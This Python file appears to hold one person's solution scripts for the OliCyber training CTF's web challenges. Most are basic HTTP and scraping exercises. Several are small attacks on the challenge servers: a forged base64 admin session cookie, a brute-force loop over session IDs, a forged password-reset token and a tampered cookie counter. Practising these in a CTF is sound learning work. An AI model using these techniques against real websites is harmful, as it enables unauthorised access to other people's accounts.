import requests
import json
from bs4 import BeautifulSoup, Comment
import re
import base64

"""
#### WEB 01 ####

url = "http://web-01.challs.olicyber.it/"
response = requests.get(url)
print(response.text)
"""

"""
#### WEB 02 ####

url = "http://web-02.challs.olicyber.it/server-records?id=flag"
response = requests.get(url)
print(response.text)
"""

"""
#### WEB 03 ####

url = "http://web-03.challs.olicyber.it/flag"
headers = {'X-Password' : 'admin'}
response = requests.get(url, headers=headers)
print(response.text)
"""

"""
#### WEB 04 ####
url = 'http://web-04.challs.olicyber.it/users'
response = requests.get(url, headers={'Accept': 'application/xml'})
print(response.text)
"""

"""
#### WEB 05 ####
url = 'http://web-05.challs.olicyber.it/flag'
response = requests.get(url, cookies={'password': 'admin'})
print(response.text)
"""

"""
#### WEB 06 ####
url_token = 'http://web-06.challs.olicyber.it/token'
url_flag = 'http://web-06.challs.olicyber.it/flag'
client = requests.session()
client.get(url_token)
response = client.get(url_flag)
print(response.text)
"""

"""
#### WEB 07 ####
url = 'http://web-07.challs.olicyber.it/'
response = requests.head(url)
print(response.headers)
"""

"""
#### WEB 08 ####
url = 'http://web-08.challs.olicyber.it/login'
data = {'username': 'admin', 'password': 'admin'}
response = requests.post(url, data)
print(response.text)
"""

"""
#### WEB 09 ####
url = 'http://web-09.challs.olicyber.it/login'
data = {'username': 'admin', 'password': 'admin'}
response = requests.post(url, json=data)
print(response.text)
"""

"""
#### WEB 10 ####
url = 'http://web-10.challs.olicyber.it/'
response = requests.options(url)
print(response.headers)
response = requests.put(url)
print(response.headers)
"""

"""
#### WEB 11 ####
url = 'http://web-11.challs.olicyber.it/login'
url_flag = 'http://web-11.challs.olicyber.it/flag_piece'
data = {'username': 'admin', 'password': 'admin'}
client = requests.session()
response = client.post(url, json=data)
csrf = response.json()['csrf']
flag = ''
for i in range(4):
    response = client.get(url_flag + f'?index={i}&csrf={csrf}')
    flag += response.json()['flag_piece']
    csrf = response.json()['csrf']
print(flag)
"""

"""
#### WEB 12 ####
url = 'http://web-12.challs.olicyber.it/'
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
paragrafi = soup.find_all('p')
print(paragrafi[1])
"""

"""
#### WEB 13 ####
url = 'http://web-13.challs.olicyber.it/'
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
evidenziati = soup.find_all('span', attrs={'class': 'red'})
flag = 'flag{'
for evidenziato in evidenziati:
    flag += evidenziato.get_text()
print(flag + '}')
"""

"""
#### WEB 14 ####
url = 'http://web-14.challs.olicyber.it/'
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
comments = soup.find_all(string=lambda text: isinstance(text, Comment))
print(comments)
"""

"""
#### WEB 15 ####
url = 'http://web-15.challs.olicyber.it/'
response = requests.get(url)
soup = BeautifulSoup(response.text, 'html.parser')
externals = soup.find_all(['link', 'script'])
for external in externals:
    try:
        link = external['href']
        response = requests.get(url + link)
        flag = re.findall('flag{.*', response.text)
        if flag:
            print(flag[0])
    except:
        pass
    try:
        link = external['src']
        response = requests.get(url + link)
        flag = re.findall('flag{.*', response.text)
        if flag:
            print(flag[0])
    except:
        pass
"""

"""
#### WEB 16 ####

url = 'http://web-16.challs.olicyber.it/'
visited = []
fringe = [url]
exit = False
while fringe:
    print('pagine da analizzare:', len(fringe))
    current = fringe.pop(0)
    visited.append(current)
    page = requests.get(current)
    soup = BeautifulSoup(page.text, 'html.parser')
    h1s = soup.find_all('h1')
    for h1 in h1s:
        flag = re.findall('flag.*', h1.get_text())
        if flag:
            print(flag)
            exit = True
    if exit: break
    next_urls = soup.find_all('a')
    for next_url in next_urls:
        next_url = url + next_url['href']
        if not next_url in visited:
            if not next_url in fringe:
                fringe.append(next_url)
"""

"""
#### WEB no robots here ####

url = 'http://no-robots.challs.olicyber.it'
client = requests.session()
response = client.get(url + '/robots.txt')
link = re.findall('/.*', response.text)[0]
response = client.get(url + link)
print(response.text)
"""

"""
#### WEB click me ####

url = 'http://click-me.challs.olicyber.it/'
client = requests.session()
cookies = {'cookies': '1000000000000000000'}
response = client.post(url, cookies=cookies)
print(response.text)
"""

"""
#### WEB cookie monster army ####

url = 'http://cma.challs.olicyber.it/home.php'
client = requests.session()
plain_admin_cookie = b'2023/11/07-1699365927-admin'
admin_cookie = base64.b64encode(plain_admin_cookie)
cookies = {'session': admin_cookie.decode()} 
response = client.get(url, cookies=cookies)
print(response.text)
"""

"""
#### WEB rick roller ####

url = 'http://roller.challs.olicyber.it/get_flag.php'
client = requests.session()
response = client.get(url, allow_redirects=False)
print(response.text)
"""

"""
#### WEB a too small reminder ####

url = 'http://too-small-reminder.challs.olicyber.it/'
client = requests.session()
for i in range(2000):
    print(i)
    cookie = {'session_id': str(i)}
    response = client.get(url + 'admin', cookies=cookie)
    if response.json()['messaggio'] != "Questa area \u00e8 riservata all'admin!":
        print(response.text)
        break
"""

"""
#### WEB password changer 3000 ####

url = 'http://password-changer.challs.olicyber.it/change-password.php'
token = base64.b64encode(b'admin').decode()
response = requests.get(url + '?token=' + token)
print(response.text)
"""